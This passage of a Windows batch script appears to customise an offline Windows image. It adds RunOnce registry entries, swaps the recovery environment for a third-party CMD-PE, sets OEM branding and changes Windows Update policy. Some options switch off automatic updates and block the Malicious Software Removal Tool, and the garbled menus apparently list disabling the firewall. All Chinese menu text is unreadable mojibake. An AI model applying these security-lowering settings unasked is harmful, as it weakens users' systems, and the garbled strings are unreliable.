echo.   ^|   ���������������������޷�Ӧ�ĵȴ�ʱ��                           ^|
if /i "!Version!"=="7" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   �Զ��ر��޷�Ӧ�ĳ��򣬱���ϵͳ��"����"����                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż��ڴ����ã�������Ϸ������������ٶ�                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�����������Դ���䣬����Ӱ��Ƶ������                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ֹԶ���޸�ע���                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***����Ч���Ż�***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�������̣������������ȼ�������ϵͳ"����"                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż��û�����������������쳣���Զ�ˢ�£���ֹϵͳ"����" -             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ӿ�����������Ԥ����ʾ�ٶ�                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***�ļ�ϵͳ�Ż�***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�Windows�ļ��б�ˢ�²���                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż����̷������ܣ������������ݵĶ�д����                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż��ļ�ϵͳ��NTFS���Ĺ������̴��ļ��ķ�Ӧʱ�� -                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�ϵͳ�Զ����Թ��ܣ����ϵͳ�����ٶ� -                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ӵ�ϵͳ��ͼ�껺�壬���ϵͳ�����ٶ� -                               ^|
echo.   ^|                                                                        ^| 
echo.   ^|   ��ֹϵͳ�Զ����ɴ��󱨸棬�ӿ�ϵͳ��Ӧ�ٶ� -                         ^|
echo.   ^|                                                                        ^| 
echo.   ^|   ��ֹU�̵��ƶ��豸���Զ����ţ���ֹ��������Ⱦ -                        ^|
echo.   ^|                                                                        ^| 
echo.   ^|   �Զ��Ż������������ӿ������ٶ� -                                     ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   ***�����Ż�***                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�Ĭ�Ϲ���                                                         ^|
if /i "!Version!"=="7" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   �رշ���ǽ                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�Զ��Э��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��������䵥Ԫ��С�Զ�̽�⡢�ڶ�·����̽�⣬�������               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�Ĭ�Ϸ��鱨�������������˷��������������                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż��������ܣ���������Ч��                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�����WINS���Ʋ�ѯʱ�䣬��ǿ�������ݴ����������������             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�����������ã�������������ȶ���                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż��������ת�����ƣ���������ٶ�                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�����������                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ż�DNS���ӿ�DNS�Ľ����ٶ�                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������䵥Ԫ�������Զ��������������練Ӧʱ�䡣���Թܼ�               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***�����Ż�***                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�������վͨ�������ҵ������б����ṩ�����������                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �رշ��������                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر��ռ����Ժ���дϰ��                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ر�windows����Ӧ������                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����Ƶ�ʸ�Ϊ"�Ӳ�"                                                   ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   �رմ����Ż�                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ҽ���ӹ���Աȡ������Ȩ                                             ^|
if /i "!Version!"=="7" echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   ȥ�� WinRAR ���Ҽ��˵�����ӵ�"ѹ��...�� E-Mail"                     ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   ��ֹ���������ֺ�̨����                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ֹ���������ֵ�Ӧ��֪ͨ                                             ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   ���±��Զ�����                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���±�ʼ����ʾ״̬��                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ü��±���NFO�ļ�                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows Media Player����ʾ�״�ʹ�öԻ���                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����Windows ��Ƭ�鿴��                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   VHD����ʱ��Ҫ��VHD��̬�ļ���չ������Խ�ʡ�ռ䣩                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ֹ����ʱ�Զ�����                                                   ^|
if !Version! neq 7 (
echo.   ^|                                                                        ^|
echo.   ^|   �رտ�������                                                         ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   ����ϵͳ��־                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���������ջ��Component Based Servicing���ļ�����                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����WfpDiag.ETL��־                                                  ^|
echo.   ^|                                                                        ^|
echo. && echo. && echo.       ���������"Windows!Version!_x!Bit!"���Ż���Ŀ���밴���������... && pause>nul
set "AppPath=File\Reg\Windows!Version!.reg"
if /i "!Version!"=="10" (
	if !ReleaseId! gtr 1809 set "AppPath=File\Reg\Windows!Version!+.reg"
)
if exist "!AppPath!" (
	copy /v /y "!AppPath!" "Mount\Windows\System32\Windows!Version!.reg" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "majorization" /t REG_SZ /d "cmd.exe /c regedit /s \"C:\Windows\System32\Windows!Version!.reg\" && del /f /q \"C:\Windows\System32\Windows!Version!.reg\"" /f >nul 2>nul
	if /i "!Version!"=="7" (
		copy /v /y "File\Reg\Windows Explorer.lnk" "!Sysprep!" >nul 2>nul
		Reg.exe add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v "29" /t REG_SZ /d "C:\Windows\system32\imageres.dll,196" /f >nul 2>nul
		Reg.exe add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v "77" /t REG_SZ /d "C:\Windows\system32\imageres.dll,196" /f >nul 2>nul
		Reg.exe add "HKCU\ZTM\Microsoft\Windows\CurrentVersion\Explorer" /v "Link" /t REG_BINARY /d "00000000" /f >nul 2>nul
		reg load HKLM\UEFI_NTUSER "Mount\Users\Default\ntuser.dat" >nul 2>nul	
		Reg.exe add "HKLM\UEFI_NTUSER\Software\Microsoft\CTF\LangBar" /v "ShowStatus" /t REG_DWORD /d "4" /f >nul 2>nul
		Reg.exe add "HKLM\UEFI_NTUSER\Software\Microsoft\CTF\LangBar" /v "ExtraIconsOnMinimized" /t REG_DWORD /d "0" /f >nul 2>nul
		Reg.exe add "HKLM\UEFI_NTUSER\Software\Microsoft\CTF\LangBar\ItemState\{ED9D5450-EBE6-4255-8289-F8A31E687228}" /v "DemoteLevel" /t REG_DWORD /d "3" /f >nul 2>nul
		taskkill /f /IM Dism++x64.exe >nul 2>nul
		taskkill /f /IM regedit.exe >nul 2>nul
		reg unload HKLM\UEFI_NTUSER >nul 2>nul	
	) else (
		copy /v /y "File\Reg\Blank.ico" "Mount\Windows" >nul 2>nul
	)
) else (
	call :AppPath
)
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "majorization" >nul 2>nul && if exist "Mount\Windows\System32\Windows!Version!.reg" ( call :Log & call :Achiexe ) else ( call :Failure )

:input8
cls&mode con cols=80 lines=30&title ����CMD-PE&set "Item=����CMD-PE"
set "goto=menu3"
echo.
echo.    ______________________________ ����CMD-PE ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �滻Windows REΪCMD-PE�����ϵͳ��װʧ�ܣ���ϵͳ���������޷�������   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ϵͳ�����Խ�CMD-PE����������������Զ�̣��������أ��鿴�����밴 G...^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����CMD-PE                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1GX /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :menu3
if errorlevel 2 (start http://cmdpe.com/post/8.html & goto :input8)
cls&&echo.&&echo.���ڼ���CMD-PE�У����Ե�...
if exist "Mount\Windows\System32\Recovery" rd /s /q "Mount\Windows\System32\Recovery" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\cmdpe\cmdpe.7z" "cmdpe.exe" -o"Mount\Windows\System32\oobe" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\cmdpe\cmdpe.7z" "cmdpe.sdi" -o"Mount\Windows\System32\Recovery" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\cmdpe\cmdpe.7z" "cmdpe.wim" -o"Mount\Windows\System32\Recovery" >nul 2>nul
reg load HKLM\CMDPE_SYSTEM "Mount\Windows\System32\config\SYSTEM" >nul 2>nul
Reg.exe add "HKLM\CMDPE_SYSTEM\Setup" /v "CmdLine" /t REG_SZ /d "oobe\cmdpe.exe" /f >nul 2>nul
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\CMDPE_SYSTEM >nul 2>nul
if exist "Mount\Windows\System32\Recovery\cmdpe.wim" ( call :Log & call :Achiexe ) else ( call :Failure )

:input9
cls&mode con cols=80 lines=30&title ���� Compact_OS
set "Item=���� Compact_OS"
set "goto=menu3"
echo.
echo.    ____________________________ ����Compact_OS ____________________________
echo.   ^|                            ----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����Compact_OS(�����Ͳ���ϵͳ)��ֻ֧��Windows 10��������ô���ϵͳ   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��װ��ռ�ø�С�Ĵ��̿ռ䣬�����ǻ�����ϵͳ��װʱ�䡣                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����Compact OS                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 2 goto :menu3
if errorlevel 1 goto :CompactOS 

:CompactOS 
cls
if /i "!Version!"=="10" (
	echo Compact.exe /CompactOS:always > "!ScriptsLog!\CompactOS.log"
	if exist "!ScriptsLog!\CompactOS.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	echo. && echo.���ص�ϵͳ��Windows!Version!���ù���ֻ֧��Windows 10���밴���������... && pause>nul && goto :menu3
)

:input10
cls&mode con cols=80 lines=30&title OEM��Ϣ����
set "Item="
set "goto=input10"
echo.
echo.    _____________________________ OEM��Ϣ���� ______________________________
echo.   ^|                             -------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �����֪��OEM��Ϣ��ʲô���鿴�����밴 G...                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ������                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] �ͺ�                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ��վ                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] ͼ��                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ��ֽ                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345GX /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 7 goto :menu3
if errorlevel 6 (start http://www.cmdpe.com/zb_users/theme/HTML5CSS3/style/images/OEM.jpg & goto :input10)
if errorlevel 5 goto :Wallpaper
if errorlevel 4 goto :Oemlogo
if errorlevel 3 goto :SupportURL
if errorlevel 2 goto :Model
if errorlevel 1 goto :Manufacturer

:Manufacturer
cls&title OEM����������&set "Manufacturer="
echo.
echo.    _____________________________ OEM���������� ____________________________
echo.   ^|                             ---------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦����OEM����Ȼ��س������践������ X Ȼ��س���         ^|
echo.   ^|                                                                        ^|
echo.
set /p Manufacturer=^>^>^>^>^>^>^>������:
if not defined Manufacturer cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :Manufacturer
if /i "!Manufacturer: =!" equ "" cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :Manufacturer
if /i "!Manufacturer!" equ "x" goto :input10
set "Item=����OEM������Ϊ!Manufacturer!"
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "Manufacturer" /t REG_SZ /d "!Manufacturer!" /f >nul 2>nul
call :Log & call :Achiexe

:Model
cls&title OEM�ͺ�����&set "Model="
echo.
echo.    ______________________________ OEM�ͺ����� _____________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦����OEM�ͺ�Ȼ��س������践������ X Ȼ��س���         ^|
echo.   ^|                                                                        ^|
echo.
set /p Model=^>^>^>^>^>^>^>������:
if not defined Model cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :Manufacturer
if /i "!Model: =!" equ "" cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :Manufacturer
if /i "!Model!" equ "x" goto :input10
set "Item=����OEM������Ϊ!Model!"
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "Model" /t REG_SZ /d "!Model!" /f >nul 2>nul
call :Log & call :Achiexe

:SupportURL
cls&title OEM��վ����&set "SupportURL="
echo.
echo.    ______________________________ OEM��վ���� _____________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦����OEM��ַȻ��س������践������ X Ȼ��س���         ^|
echo.   ^|                                                                        ^|
echo.
set /p SupportURL=^>^>^>^>^>^>^>������:
if not defined SupportURL cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :SupportURL
if /i "!SupportURL: =!" equ "" cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :SupportURL
if /i "!SupportURL!" equ "x" goto :input10
set "Item=����OEM��վΪ!SupportURL!"
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "SupportURL" /t REG_SZ /d "!SupportURL!" /f >nul 2>nul
call :Log & call :Achiexe

:Oemlogo
cls&title OEMͼ������&set "Item=����OEMͼ��"
echo.
echo.    ______________________________ OEMͼ������ _____________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��.bmp��ʽͼ��Դ�ļ�������·��Ȼ��س���       ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
echo.
set /p LogoPath=^>^>^>^>^>^>^>������:
if not defined LogoPath cls&&echo.&&echo.��������Ϊ�գ��밴�����������������......&&pause>nul&&goto :Oemlogo
set "LogoPath=!LogoPath:"=!"
if /i "!LogoPath!" equ "x" goto :input10
if "%LogoPath:~-4%" neq ".bmp" (cls&&echo.&&echo.���������ʽ����ȷ���밴�����������������...&&pause>nul&&goto :Oemlogo)
if exist "!LogoPath!" (
	copy /v /y "!LogoPath!" "Mount\Windows\System32\OEM.bmp" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "logo" /t REG_SZ /d "OEM.bmp" /f >nul 2>nul
) else ( 
	cls && echo. && echo.���������ʽ����ȷ���밴�����������������... && pause>nul && goto :input10 
)
call :Log & call :Achiexe

:Wallpaper
cls&title �����ֽ����&set "Item=�����ֽ����"
echo.
echo.    _____________________________ �����ֽ���� _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��.jpg��ʽͼƬԴ�ļ�������·��Ȼ��س���       ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
echo.
set /p Wallpaper=^>^>^>^>^>^>^>������:
if not defined Wallpaper cls&&echo.&&echo.��������Ϊ�գ��밴�����������������......&&pause>nul&&goto :Oemlogo
set "Wallpaper=!Wallpaper:"=!"
if /i "!Wallpaper!" equ "x" goto :input10
if /i "%Wallpaper:~-4%" neq ".jpg" (cls&&echo.&&echo.���������ʽ����ȷ���밴�����������������...&&pause>nul&&goto :Oemlogo)
if exist "!Wallpaper!" (
	copy /v /y "!Wallpaper!" "Mount\Windows\Web\Wallpaper\OEM.jpg" >nul 2>nul
	copy /v /y "File\Bin\x64\PECMD.EXE" "Mount\Windows\Sysprep\PECMD.EXE" >nul 2>nul
	echo %%Windir%%\Sysprep\PECMD.EXE Wall C:\Windows\web\wallpaper\OEM.jpg > "!ScriptsLog!\Wallpaper.log"
	echo del /f /q %%Windir%%\Sysprep\PECMD.EXE >> "!ScriptsLog!\Wallpaper.log"
	REM taskkill /f /im dism++x64.exe >nul 2>nul
	REM taskkill /f /im regedit.exe >nul 2>nul
	REM reg load HKLM\ZTM_DEFAULT "Mount\Windows\System32\config\DEFAULT" >nul 2>nul
	REM reg add "HKLM\ZTM_DEFAULT\Control Panel\Desktop" /v "WallPaper" /t REG_SZ /d "C:\Windows\web\wallpaper\OEM.jpg" /f >nul 2>nul
	REM reg unload HKLM\ZTM_DEFAULT >nul 2>nul
	REM copy /v /y "!Wallpaper!" "Mount\Windows\Web\Wallpaper\OEM.jpg" >nul 2>nul
	REM echo reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "WallPaper" /t REG_SZ /d "C:\Windows\web\wallpaper\OEM.jpg" /f > "!ScriptsLog!\Wallpaper.log"
) else ( 
	cls && echo. && echo.���������ʽ����ȷ���밴�����������������... && pause>nul && goto :input10 
)
if exist "!ScriptsLog!\Wallpaper.log" ( call :Log & call :Achiexe ) else ( call :Failure )
REM call :Log & call :Achiexe

:input11
cls&mode con cols=80 lines=30&title IE��ҳ����
set "Item="
set "goto=menu3"
echo.
echo.    ______________________________ IE��ҳ���� ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦����IE�������ҳ��ַ��Ȼ��س���                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
echo.
set "IeHome="
set /p IeHome=^>^>^>^>^>^>^>�����룺
if not defined IeHome cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :input11
if /i "!IeHome: =!" equ "" cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :input11
if /i "!IeHome!" equ "x" goto :menu3
set "Item=����IE��ҳΪ!IeHome!"
echo reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "!IeHome!" /f > "!ScriptsLog!\IeHome.log"
if exist "!ScriptsLog!\IeHome.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input12
cls&mode con cols=80 lines=30&title Windows��������
set "Item="
set "goto=input12"
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���賹�׽���Windows Update���¹��ܣ�ֱ������ѡ��[6]����...           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �Ƿ��Զ���װ���������ĸ���                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ���¹���ʱ������û���¼�Ƿ��Զ����������                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] Windows�����Ƿ�����������򣨽����Windows10��                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] Windows�����Ƿ�����������ɾ������                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ��Windows���µ���Ϊ...                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] ���û�����Windows���·���                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123456X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 7 goto :menu3
if errorlevel 6 goto :UpdateSet6
if errorlevel 5 goto :UpdateSet5
if errorlevel 4 goto :UpdateSet4
if errorlevel 3 goto :UpdateSet3
if errorlevel 2 goto :UpdateSet2
if errorlevel 1 goto :UpdateSet1

:UpdateSet1
cls
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   �Ƿ��Զ���װ���������ĸ��£�                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=���Զ���װ���������ĸ���-����" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AutoInstallMinorUpdates" /t REG_DWORD /d "0" /f >nul 2>nul)
if errorlevel 1 (set "Item=�Զ���װ���������ĸ���-����" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AutoInstallMinorUpdates" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet2
cls
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���¹���ʱ������û���¼�Ƿ��Զ������������                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=���¹���ʱ������û���¼�Զ����������-����" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d "0" /f >nul 2>nul)
if errorlevel 1 (set "Item=���¹���ʱ������û���¼���Զ����������-����" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe
:UpdateSet3
cls
if /i not "!Version!"=="10" (cls && echo. && echo.���������Windows10���ѹ��ص�ϵͳ��Windows!Version!���밴���������... && pause>nul && goto :input12)
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows�����Ƿ������������(������Windows10)                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��:
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=Windows���°�����������-����" & Reg delete "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /f >nul 2>nul & Reg ADD "HKLM\ZTM\Microsoft\Windows\CurrentVersion\DriverSearching" /v SearchOrderConfig /t REG_DWORD /d 1 /f >nul 2>nul)
if errorlevel 1 (set "Item=Windows���²�������������-����" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f >nul 2>nul & Reg ADD "HKLM\ZTM\Microsoft\Windows\CurrentVersion\DriverSearching" /v SearchOrderConfig /t REG_DWORD /d 0 /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet4
cls
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows�����Ƿ�����������ɾ�����ߣ�                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=Windows���°����������ɾ������-����" & Reg delete "HKLM\ZTM\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /f >nul 2>nul)
if errorlevel 1 (set "Item=Windows���²������������ɾ������-����" & Reg add "HKLM\ZTM\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet5
cls
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��Windows���µ���Ϊ...                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �Ӳ�������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��������                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ��鲢���ظ���                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] �Զ���װ���£�Ĭ�ϣ�                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1234X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 5 goto :input12
if errorlevel 4 (set "Item=��Windows���µ���Ϊ-�Զ���װ����" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "4" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "0" /f >nul 2>nul)
if errorlevel 3 (set "Item=��Windows���µ���Ϊ-��鲢���ظ���" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "3" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>nul)
if errorlevel 2 (set "Item=��Windows���µ���Ϊ-��������" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "2" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>nul)
if errorlevel 1 (set "Item=��Windows���µ���Ϊ-�Ӳ�������" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "1" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet6
cls
echo.
echo.    ___________________________ Windows�������� ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[1]:�����׽���Windows Update���·���                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[2]:����������Windows Update���·���                           ^|
echo.   ^|                                                                        ^|
